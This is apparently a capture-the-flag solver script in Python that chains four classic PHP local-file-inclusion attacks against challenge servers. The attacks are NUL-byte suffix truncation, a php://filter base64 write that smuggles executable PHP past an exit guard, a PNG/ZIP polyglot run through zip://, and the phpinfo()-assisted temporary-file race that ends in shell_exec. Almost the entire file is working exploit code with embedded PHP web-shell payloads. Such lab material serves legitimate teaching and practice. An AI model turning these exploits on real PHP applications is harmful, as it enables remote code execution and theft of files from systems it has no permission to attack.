#!/usr/bin/env python3
"""
20 - LFI classic toolkit.  Four exhibits, one flag.

  stage 1  NUL-byte truncation against a hard-coded ".php" suffix
           (PHP 5.3.3 only - 5.3.4 killed it, and we prove that here)
  stage 2  php://filter/write=convert.base64-decode, Stefan Esser's loose
           base64 trick, to write executable PHP past a content filter that
           forbids PHP and past a guard line that forbids execution
  stage 3  a PNG that is also a ZIP, included as zip://photo.png#shell.php
           to defeat the same hard-coded ".php" suffix a wrapper at a time
  stage 4  the RFC1867 temporary-file race with phpinfo() assistance:
           hold one upload's response open, read phpinfo() until it prints
           /tmp/phpXXXXXX, then include that path while the request is stalled

Python 3 standard library only.
"""
import base64
import io
import re
import socket
import struct
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
import zipfile
import zlib

CHALLENGE = sys.argv[1] if len(sys.argv) > 1 else "http://challenge"
LEGACY = sys.argv[2] if len(sys.argv) > 2 else "http://legacy"

STAGE1_KEY = "/opt/museum/keys/stage1.key"
STAGE2_KEY = "/opt/museum/keys/stage2.key"
STAGE3_KEY = "/opt/museum/keys/stage3.key"

B64_ALPHABET = set(b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/")
GUARD = b"; <?php exit; ?> DO NOT REMOVE THIS LINE\n"

TIMEOUT = 25


def log(msg):
    print(msg, flush=True)


def get(url, timeout=TIMEOUT):
    """GET, returning (status, body) and never raising on 4xx/5xx."""
    req = urllib.request.Request(url)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def post_form(url, fields, timeout=TIMEOUT):
    data = urllib.parse.urlencode(fields).encode()
    req = urllib.request.Request(url, data=data)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def post_file(url, field, filename, blob, content_type="application/octet-stream",
              timeout=TIMEOUT):
    bnd = "----museum" + uuid.uuid4().hex
    body = (
        ("--%s\r\nContent-Disposition: form-data; name=\"%s\"; filename=\"%s\"\r\n"
         "Content-Type: %s\r\n\r\n" % (bnd, field, filename, content_type)).encode()
        + blob + ("\r\n--%s--\r\n" % bnd).encode()
    )
    req = urllib.request.Request(
        url, data=body,
        headers={"Content-Type": "multipart/form-data; boundary=" + bnd})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def split_host(base):
    u = urllib.parse.urlsplit(base)
    return u.hostname, (u.port or (443 if u.scheme == "https" else 80))


# ---------------------------------------------------------------------------
# stage 1 - truncation
# ---------------------------------------------------------------------------

def stage1():
    log("[stage 1] truncation against a hard-coded '.php' suffix")
    payload = urllib.parse.quote(STAGE1_KEY + "\x00", safe="")

    targets = [
        ("%s/stage1.php" % LEGACY, "php 5.3.3  (legacy wing)"),
        ("%s/v534/stage1.php" % LEGACY, "php 5.3.4  (legacy wing)"),
        ("%s/stage1.php" % CHALLENGE, "php 8.2.33 (modern wing)"),
    ]
    token = None
    for url, label in targets:
        _, body = get("%s?page=%s" % (url, payload))
        m = re.search(rb"k1-[0-9a-z-]+", body)
        if m:
            log("           %s  NUL byte truncates -> %s" % (label, m.group(0).decode()))
            if token is None:
                token = m.group(0).decode()
        else:
            log("           %s  NUL byte rejected" % label)

    # The other historical variant: push the path past PATH_MAX so that the
    # ".php" falls off the end.  It does not reproduce on any Linux build we
    # can obtain - see WRITEUP.md, "stage 1".  Tried once here so the claim
    # in the writeup is something the solver actually re-checks.
    long_path = STAGE1_KEY + "/." * 2100
    _, body = get("%s/stage1.php?page=%s"
                  % (LEGACY, urllib.parse.quote(long_path, safe="")))
    ok = b"k1-" in body
    log("           php 5.3.3  over-long path (%d bytes): %s"
        % (len(long_path) + 4, "truncates" if ok else "rejected (expected)"))

    if token is None:
        raise SystemExit("stage 1 failed: no key fragment")
    log("[stage 1] OK - key fragment 1 = %s" % token)
    return token


# ---------------------------------------------------------------------------
# stage 2 - loose base64 decoding in php://filter
# ---------------------------------------------------------------------------

def loose_b64_decode(data):
    """Model of php_conv_base64_decode_convert(): skip everything that is not
    in the alphabet, then consume what is left four characters at a time."""
    kept = bytes(c for c in data if c in B64_ALPHABET)
    kept = kept[:len(kept) // 4 * 4]
    return base64.b64decode(kept)


def stage2():
    log("[stage 2] php://filter/write=convert.base64-decode (Stefan Esser, Piwik)")
    survivors = bytes(c for c in GUARD if c in B64_ALPHABET)
    log("           guard line contributes %d base64 characters (%r)"
        % (len(survivors), survivors.decode()))

    payload = (b'<?php echo "K2:" . @file_get_contents("%s"); ?>'
               % STAGE2_KEY.encode())
    while len(payload) % 3:                       # keep '=' out of the stream
        payload += b" "
    blob = base64.b64encode(payload)
    assert b"=" not in blob

    # Align our payload on a four-character group boundary, and make sure the
    # bytes the guard line degenerates into contain no '<' that could confuse
    # the parser.
    pad = None
    for n in range(0, 4):
        cand = b"A" * n
        if (len(survivors) + n) % 4:
            continue
        junk = loose_b64_decode(GUARD + cand)
        if b"<" not in junk and b"\x00" not in junk[:1]:
            pad, junk_len = cand, len(junk)
            break
    if pad is None:
        raise SystemExit("stage 2: no usable alignment padding")
    log("           padding %r aligns the stream; %d junk bytes precede '<?php'"
        % (pad.decode(), junk_len))

    body = pad + blob
    simulated = loose_b64_decode(GUARD + body)
    if not simulated.endswith(payload):
        raise SystemExit("stage 2: offline simulation does not reproduce the payload")
    log("           offline simulation: the decoder reproduces the payload verbatim")

    note = "phrack20"
    target = ("php://filter/write=convert.base64-decode/resource=notes/%s" % note)
    st, out = post_form("%s/stage2.php" % CHALLENGE,
                        {"file": target, "body": body.decode()})
    m = re.search(rb'<p class="msg">(.*?)</p>', out, re.S)
    log("           note keeper says: %s"
        % (m.group(1).decode().strip() if m else "(no message)"))

    _, out = get("%s/stage2.php?note=%s" % (CHALLENGE, note))
    m = re.search(rb"K2:(k2-[0-9a-z-]+)", out)
    if not m:
        raise SystemExit("stage 2 failed: note did not execute (%r)" % out[:200])
    token = m.group(1).decode()
    log("[stage 2] OK - key fragment 2 = %s" % token)
    return token


# ---------------------------------------------------------------------------
# stage 3 - zip:// wrapper
# ---------------------------------------------------------------------------

def make_png(w=16, h=16):
    def chunk(tag, data):
        c = tag + data
        return struct.pack(">I", len(data)) + c + struct.pack(">I", zlib.crc32(c) & 0xFFFFFFFF)
    raw = b"".join(b"\x00" + bytes([(x * 37 + y * 11) % 256 for x in range(w * 3)])
                   for y in range(h))
    return (b"\x89PNG\r\n\x1a\n"
            + chunk(b"IHDR", struct.pack(">IIBBBBB", w, h, 8, 2, 0, 0, 0))
            + chunk(b"IDAT", zlib.compress(raw))
            + chunk(b"IEND", b""))


def make_png_zip(inner_name, inner_data):
    """A PNG whose tail is a ZIP.  The archive is *appended* in 'a' mode so
    every offset in the central directory counts from the start of the file
    (the self-extracting-archive layout).  A naive `cat a.png b.zip` leaves
    the offsets relative to the ZIP and modern libzip rejects it."""
    buf = io.BytesIO()
    buf.write(make_png())
    with zipfile.ZipFile(buf, "a", zipfile.ZIP_DEFLATED) as z:
        z.writestr(inner_name, inner_data)
    return buf.getvalue()


def stage3():
    log("[stage 3] zip:// wrapper vs. a hard-coded '.php' suffix (CODEGATE 2015 Owlur)")
    shell = ('<?php echo "K3:" . @file_get_contents("%s"); ?>' % STAGE3_KEY)
    blob = make_png_zip("shell.php", shell)
    log("           polyglot: %d bytes, PNG signature at offset 0, ZIP central "
        "directory at the end" % len(blob))

    st, out = post_file("%s/stage3.php" % CHALLENGE, "photo", "exhibit.png",
                        blob, "image/png")
    m = re.search(rb"uploads/([0-9a-f]{40}\.png)", out)
    if not m:
        raise SystemExit("stage 3 failed: upload refused (%r)" % out[-300:])
    stored = m.group(1).decode()
    log("           upload passed the .png name check and getimagesize(): %s" % stored)

    view = "zip://uploads/%s#shell" % stored          # the app appends '.php'
    _, out = get("%s/stage3.php?view=%s"
                 % (CHALLENGE, urllib.parse.quote(view, safe="")))
    m = re.search(rb"K3:(k3-[0-9a-z-]+)", out)
    if not m:
        raise SystemExit("stage 3 failed: zip:// include produced nothing")
    token = m.group(1).decode()
    log("[stage 3] OK - key fragment 3 = %s" % token)
    return token


# ---------------------------------------------------------------------------
# stage 4 - RFC1867 temporary file race, with phpinfo() assistance
# ---------------------------------------------------------------------------

PAD_HEADERS = 90         # Apache's LimitRequestFields default is 100
PAD_LENGTH = 7900        # Apache's LimitRequestFieldSize default is 8190
READ_WINDOW = 2048       # small SO_RCVBUF -> TCP back-pressure -> PHP blocks
TMP_RE = re.compile(rb"/tmp/php[A-Za-z0-9]{6}")


def build_upload_request(host, key, payload):
    bnd = "----race" + uuid.uuid4().hex
    body = (("--%s\r\nContent-Disposition: form-data; name=\"diag\"; "
             "filename=\"diag.txt\"\r\nContent-Type: text/plain\r\n\r\n" % bnd).encode()
            + payload + ("\r\n--%s--\r\n" % bnd).encode())
    head = ["POST /stage4.php?key=%s HTTP/1.1" % urllib.parse.quote(key, safe=":"),
            "Host: %s" % host,
            "Content-Type: multipart/form-data; boundary=%s" % bnd,
            "Content-Length: %d" % len(body),
            "Connection: close"]
    # Padding that phpinfo() prints *after* $_FILES (as $_SERVER["HTTP_X_PAD_n"]),
    # so that the response is still being written when the temp name shows up.
    for i in range(PAD_HEADERS):
        head.append("X-Pad-%03d: %s" % (i, "A" * PAD_LENGTH))
    return ("\r\n".join(head) + "\r\n\r\n").encode() + body


def one_race(host, port, key, payload, marker):
    """One attempt.  Returns the response of the include, or None."""
    holder = socket.socket()
    try:
        # A tiny receive buffer is the whole trick: the kernel stops acking,
        # Apache's write() blocks inside phpinfo(), and PHP never reaches the
        # request shutdown that unlinks /tmp/phpXXXXXX.
        holder.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, READ_WINDOW)
        holder.settimeout(TIMEOUT)
        holder.connect((host, port))
        holder.sendall(build_upload_request(host, key, payload))

        buf = b""
        tmp = None
        deadline = time.time() + TIMEOUT
        while time.time() < deadline and len(buf) < 8 << 20:
            chunk = holder.recv(16384)
            if not chunk:
                break
            buf += chunk
            m = TMP_RE.search(buf)
            if m:
                tmp = m.group(0).decode()
                break
        if tmp is None:
            return None

        # Do NOT read any further: the response is only half delivered and the
        # upload request is parked inside write().
        fire = socket.create_connection((host, port), timeout=TIMEOUT)
        try:
            fire.sendall(("GET /stage4.php?key=%s&run=%s HTTP/1.1\r\nHost: %s\r\n"
                          "Connection: close\r\n\r\n"
                          % (urllib.parse.quote(key, safe=":"), tmp, host)).encode())
            out = b""
            fire.settimeout(TIMEOUT)
            while True:
                chunk = fire.recv(65536)
                if not chunk:
                    break
                out += chunk
        finally:
            fire.close()
        return out if marker in out else None
    except (OSError, socket.timeout):
        return None
    finally:
        try:
            holder.close()
        except OSError:
            pass


def stage4(key, rounds=8, threads=4, budget=120.0):
    """Bounded: at most `rounds * threads` attempts and `budget` seconds.
    Fails loudly rather than hanging."""
    log("[stage 4] RFC1867 temp-file race with phpinfo() assistance "
        "(Brett Moore, 2011)")
    host, port = split_host(CHALLENGE)
    payload = b'<?php echo "MUSEUM-RCE:"; echo shell_exec("/readflag"); ?>'
    marker = b"MUSEUM-RCE:"

    st, body = get("%s/stage4.php" % CHALLENGE)
    log("           without the curator key: HTTP %d, %r" % (st, body[:34]))
    log("           %d padding headers x %d bytes land in $_SERVER, i.e. *after*"
        % (PAD_HEADERS, PAD_LENGTH))
    log("           $_FILES in the phpinfo() output; SO_RCVBUF=%d keeps PHP"
        % READ_WINDOW)
    log("           blocked in write() while we include the temp file")

    found = []
    started = [0]
    lock = threading.Lock()
    stop = threading.Event()
    deadline = time.time() + budget
    cap = rounds * threads

    def worker():
        while not stop.is_set() and time.time() < deadline:
            with lock:
                if found or started[0] >= cap:
                    return
                started[0] += 1
                mine = started[0]
            out = one_race(host, port, key, payload, marker)
            if out is not None:
                with lock:
                    found.append((mine, out))
                stop.set()
                return

    t0 = time.time()
    pool = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    for t in pool:
        t.start()
    for t in pool:
        t.join(timeout=max(1.0, deadline - time.time()))
    stop.set()

    if not found:
        raise SystemExit(
            "stage 4 failed: no temp file survived %d attempt(s) in %.0fs.\n"
            "  The hold depends on TCP back-pressure reaching PHP.  If you are\n"
            "  running this against a *published* port (127.0.0.1:8020), Docker's\n"
            "  userland proxy drains the response for you and PHP never blocks.\n"
            "  Run it inside the compose network instead: `make solve`."
            % (started[0], time.time() - t0))
    n, out = found[0]
    log("           won on attempt #%d of at most %d (%d thread(s), %.1fs)"
        % (n, cap, threads, time.time() - t0))
    m = re.search(rb"PHRACK\{[^}]*\}", out)
    if not m:
        raise SystemExit("stage 4: included the temp file but /readflag said nothing")
    log("[stage 4] OK - code execution as the web user, /readflag ran")
    return m.group(0).decode()


# ---------------------------------------------------------------------------

def main():
    log("target: %s   legacy wing: %s" % (CHALLENGE, LEGACY))
    k1 = stage1()
    k2 = stage2()
    k3 = stage3()
    key = "%s:%s:%s" % (k1, k2, k3)
    log("curator key assembled: %s" % key)
    flag = stage4(key)
    log("")
    log("FLAG: %s" % flag)
    return 0


if __name__ == "__main__":
    sys.exit(main())
